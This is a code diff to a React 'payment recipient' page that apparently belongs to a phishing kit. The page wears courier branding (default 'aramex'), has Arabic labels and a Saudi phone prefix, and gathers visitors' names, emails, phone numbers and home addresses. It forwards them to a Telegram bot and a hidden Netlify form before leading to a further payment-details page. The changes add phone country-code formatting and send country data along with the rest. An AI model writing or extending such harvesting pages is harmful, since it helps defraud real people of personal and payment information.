@@ -6,6 +6,7 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCountryByCode } from "@/lib/countries";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -33,7 +34,12 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  
+
+  // Get country from link data
+  const countryCode = linkData?.country_code;
+  const countryData = getCountryByCode(countryCode || "");
+  const phoneCode = countryData?.phoneCode || "+966";
+
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -65,18 +71,24 @@ const PaymentRecipient = () => {
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    // Format phone number with country code
+    const formattedPhone = customerPhone.startsWith(phoneCode)
+      ? customerPhone
+      : `${phoneCode} ${customerPhone}`;
+
     // Submit to Netlify Forms
     const formData = new FormData();
     formData.append('form-name', 'payment-recipient');
     formData.append('name', customerName);
     formData.append('email', customerEmail);
-    formData.append('phone', customerPhone);
+    formData.append('phone', formattedPhone);
     formData.append('address', residentialAddress);
     formData.append('service', serviceName);
     formData.append('amount', formattedAmount);
     formData.append('linkId', id || '');
-    
+    formData.append('country', countryData?.nameAr || '');
+
     try {
       await fetch('/', {
         method: 'POST',
@@ -86,17 +98,19 @@ const PaymentRecipient = () => {
     } catch (error) {
       console.error('Form submission error:', error);
     }
-    
+
     // Send data to Telegram
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
       data: {
         name: customerName,
         email: customerEmail,
-        phone: customerPhone,
+        phone: formattedPhone,
         address: residentialAddress,
         service: serviceName,
         amount: formattedAmount,
+        country: countryData?.nameAr || '',
+        countryCode: countryCode || '',
         payment_url: `${window.location.origin}/pay/${id}/details`
       },
       timestamp: new Date().toISOString()
@@ -111,10 +125,12 @@ const PaymentRecipient = () => {
     sessionStorage.setItem('customerInfo', JSON.stringify({
       name: customerName,
       email: customerEmail,
-      phone: customerPhone,
+      phone: formattedPhone,
       address: residentialAddress,
       service: serviceName,
-      amount: formattedAmount
+      amount: formattedAmount,
+      country: countryData?.nameAr || '',
+      countryCode: countryCode || ''
     }));
     navigate(`/pay/${id}/details`);
   };
@@ -219,15 +235,20 @@ const PaymentRecipient = () => {
                       <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                       رقم الهاتف
                     </Label>
-                    <Input
-                      id="phone"
-                      type="tel"
-                      value={customerPhone}
-                      onChange={(e) => setCustomerPhone(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
-                      placeholder="+966 5X XXX XXXX"
-                    />
+                    <div className="relative">
+                      <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                        <span className="text-sm text-muted-foreground">{phoneCode}</span>
+                      </div>
+                      <Input
+                        id="phone"
+                        type="tel"
+                        value={customerPhone}
+                        onChange={(e) => setCustomerPhone(e.target.value)}
+                        required
+                        className="h-10 sm:h-12 text-sm sm:text-base pr-16"
+                        placeholder="5X XXX XXXX"
+                      />
+                    </div>
                   </div>
                   
                   <div>
@@ -272,6 +293,7 @@ const PaymentRecipient = () => {
                 <input type="text" name="service" />
                 <input type="text" name="amount" />
                 <input type="text" name="linkId" />
+                <input type="text" name="country" />
               </form>
             </Card>
           </div>
